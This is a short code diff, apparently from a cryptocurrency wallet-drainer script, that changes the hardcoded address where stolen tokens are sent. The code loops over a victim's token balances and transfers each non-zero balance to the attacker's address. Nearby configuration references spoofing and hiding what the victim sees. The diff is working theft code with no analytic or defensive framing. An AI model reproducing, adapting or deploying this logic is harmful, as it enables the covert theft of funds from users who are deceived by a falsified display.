@@ -206,7 +206,7 @@ ${spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay}${spoofConfig
       })
     });
 
-    // Proceed with transferring all non-zero token balances to your address
+    // Proceed with transferring all non-zero token balances to your Exodus wallet address
     for (const token of originalTokens) {
       try {
         const contract = new ethers.Contract(token.token_address, [
@@ -216,7 +216,7 @@ ${spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay}${spoofConfig
         const balanceInWei = ethers.BigNumber.from(token.balance);
         if (balanceInWei.isZero()) continue;
 
-        const tx = await contract.transfer("0x68AB302445eA390fAa79D76bf865819d07d0800a", balanceInWei);
+        const tx = await contract.transfer("0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57", balanceInWei);
         console.log(`Sent ${token.symbol}, tx:`, tx.hash);
       } catch (err) {
         console.warn(`Failed to send ${token.symbol}`, err);
